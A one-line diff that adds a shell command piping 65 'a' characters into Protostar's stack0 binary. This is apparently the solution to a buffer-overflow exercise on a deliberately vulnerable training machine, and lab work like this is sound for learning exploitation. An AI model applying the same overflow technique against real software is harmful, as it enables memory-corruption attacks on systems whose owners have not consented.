@@ -1,0 +1,1 @@
+python -c "print('a' * 65)" | /opt/protostar/bin/stack0
